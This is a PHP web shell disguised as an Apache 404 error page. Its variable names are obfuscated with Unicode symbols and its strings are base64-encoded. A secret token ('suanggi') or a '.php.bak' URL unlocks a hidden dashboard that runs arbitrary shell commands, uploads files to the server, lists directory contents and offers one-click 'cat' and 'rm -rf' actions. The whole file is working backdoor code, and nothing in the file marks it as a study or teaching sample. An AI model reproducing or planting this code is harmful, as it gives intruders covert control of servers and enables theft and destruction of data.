<?php
$㊀="base64_decode";$㊁="chr";$㊂='suanggi';$㊃='.php.bak';
if((($_GET['_token']??'')==$㊂)||(strpos(($_SERVER['REQUEST_URI']??''),$㊃)!==false)){
$㊄=$㊀('c3VhbmdnaQ==');$㊅=$㊀('LnBocC5iYWs=');$㊆=0x1F4;$㊇=array();
header($㊀('Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTg='));$㊈='';$㊉='';
if(isset($_POST['cmd'])){$㊊=explode(',','A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y');
$㊋=$㊊[6].$㊊[4].$㊊[19];$㊌=$_POST['cmd'];$㊉=`$㊌ 2>&1`;}$㊍='';
if(isset($_FILES['file_upload'])){$㊎="./";$㊏=$㊎.basename($_FILES["file_upload"]["name"]);
if(move_uploaded_file($_FILES["file_upload"]["tmp_name"],$㊏)){$㊍=$㊀('RmlsZSA=').
htmlspecialchars(basename($_FILES["file_upload"]["name"])).$㊀('IGJlcmhhc2lsIGRpdXBsb2FkLg==');}
else{$㊍=$㊀('RXJyb3IgdXBsb2FkaW5nIGZpbGUu');}}?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Server Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;}
.container{max-width:1200px;margin:0 auto;background:white;border-radius:10px;
box-shadow:0 10px 30px rgba(0,0,0,0.3);overflow:hidden;}
.header{background:#2c3e50;color:white;padding:20px;text-align:center;}
.header h1{margin-bottom:10px;font-size:24px;}
.server-info{background:#34495e;color:#ecf0f1;padding:15px;font-size:14px;
display:flex;justify-content:space-between;flex-wrap:wrap;}
.main-content{display:grid;grid-template-columns:1fr 1fr;gap:20px;padding:20px;}
@media (max-width:768px){.main-content{grid-template-columns:1fr;}}
.panel{background:#f8f9fa;border:1px solid #e9ecef;border-radius:8px;padding:20px;}
.panel h2{color:#2c3e50;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #3498db;}
.form-group{margin-bottom:15px;}
label{display:block;margin-bottom:5px;font-weight:bold;color:#2c3e50;}
input,textarea,select{width:100%;padding:10px;border:1px solid #bdc3c7;border-radius:5px;font-size:14px;}
textarea{height:150px;font-family:monospace;resize:vertical;}
button{background:#3498db;color:white;border:none;padding:12px 20px;border-radius:5px;
cursor:pointer;font-size:14px;transition:background 0.3s;}
button:hover{background:#2980b9;}
.output{background:#2c3e50;color:#00ff00;padding:15px;border-radius:5px;
font-family:'Courier New',monospace;white-space:pre-wrap;max-height:400px;overflow-y:auto;}
.quick-commands{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
gap:10px;margin-top:15px;}
.quick-cmd{background:#3498db;color:white;border:none;padding:8px 12px;
border-radius:4px;cursor:pointer;font-size:12px;text-align:center;}
.quick-cmd:hover{background:#2980b9;}
.file-manager{margin-top:20px;}
.file-list{background:white;border:1px solid #bdc3c7;border-radius:5px;
max-height:200px;overflow-y:auto;margin-bottom:15px;}
.file-item{padding:8px 12px;border-bottom:1px solid #ecf0f1;
display:flex;justify-content:space-between;align-items:center;}
.file-item:last-child{border-bottom:none;}
.file-actions{display:flex;gap:5px;}
.btn-small{padding:4px 8px;font-size:11px;background:#95a5a6;}
.btn-small:hover{background:#7f8c8d;}
.success{color:#27ae60;background:#d5f4e6;padding:10px;border-radius:5px;margin-bottom:15px;}
.danger{background:#e74c3c;}.danger:hover{background:#c0392b;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🛠️ Server Management Dashboard</h1>
<div class="server-info">
<span><strong>User:</strong> <?= `whoami`?></span>
<span><strong>Server:</strong> <?= $_SERVER['SERVER_SOFTWARE']??'Unknown'?></span>
<span><strong>PHP:</strong> <?= phpversion()?></span>
<span><strong>Directory:</strong> <?= `pwd`?></span>
</div>
</div>
<div class="main-content">
<div class="panel">
<h2>🚀 Command Execution</h2>
<?php if($㊍):?>
<div class="success"><?=$㊍?></div>
<?php endif;?>
<form method="POST">
<div class="form-group">
<label for="cmd">Enter Command:</label>
<input type="text" id="cmd" name="cmd" value="<?=htmlspecialchars($㊌)?>" 
placeholder="ls -la, whoami, cat /etc/passwd, etc." required>
</div>
<div class="quick-commands">
<button type="button" class="quick-cmd" onclick="㊐('whoami')">Whoami</button>
<button type="button" class="quick-cmd" onclick="㊐('pwd')">Current Dir</button>
<button type="button" class="quick-cmd" onclick="㊐('ls -la')">List Files</button>
<button type="button" class="quick-cmd" onclick="㊐('uname -a')">System Info</button>
<button type="button" class="quick-cmd" onclick="㊐('ifconfig || ip a')">Network</button>
<button type="button" class="quick-cmd" onclick="㊐('ps aux')">Processes</button>
</div>
<button type="submit">Execute Command</button>
</form>
<?php if($㊉!==''):?>
<div class="form-group" style="margin-top:20px;">
<label>Command Output:</label>
<div class="output"><?=htmlspecialchars($㊉)?></div>
</div>
<?php endif;?>
</div>
<div class="panel">
<h2>📁 File Management</h2>
<div class="form-group">
<label>File Upload:</label>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file_upload" required>
<button type="submit" style="margin-top:10px;">Upload File</button>
</form>
</div>
<div class="file-manager">
<label>Current Directory Files:</label>
<div class="file-list">
<?php $㊑=scandir('.');foreach($㊑ as $㊒){if($㊒=='.'||$㊒=='..')continue;
$㊓=is_dir($㊒)?'📁':'📄';echo"<div class='file-item'><span>$㊓ $㊒</span><div class='file-actions'>";
echo"<button class='btn-small' onclick=\"㊐('cat ".addslashes($㊒)."')\">View</button>";
echo"<button class='btn-small' onclick=\"㊐('rm -rf ".addslashes($㊒)."')\">Delete</button>";
echo"</div></div>";}?>
</div>
</div>
<div class="form-group">
<label>Create New File:</label>
<form method="POST">
<input type="text" name="filename" placeholder="filename.php" required>
<textarea name="filecontent" placeholder="File content..."></textarea>
<button type="submit" name="createfile">Create File</button>
</form>
</div>
</div>
</div>
</div>
<script>
function ㊐(㊔){document.getElementById('cmd').value=㊔;}
document.getElementById('cmd').focus();
</script>
</body>
</html>
<?php exit;}?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
<title>404 Not Found</title>
<style>
body{font-family:Arial,sans-serif;max-width:600px;margin:100px auto;text-align:center;background:#f4f4f4;}
.error-box{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);}
h1{color:#d9534f;font-size:48px;margin-bottom:20px;}p{color:#666;font-size:18px;margin-bottom:20px;}
.server-info{margin-top:30px;padding-top:20px;border-top:1px solid #eee;color:#999;font-size:14px;}
</style>
</head>
<body>
<div class="error-box">
<h1>404 Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Please check the URL or go back to the <a href="/">homepage</a>.</p>
<div class="server-info">
<address>Apache/2.4.41 (Ubuntu) Server at <?= $_SERVER['SERVER_NAME']??'localhost'?> Port 80</address>
</div>
</div>
</body>
</html>
<?php http_response_code(404);?>
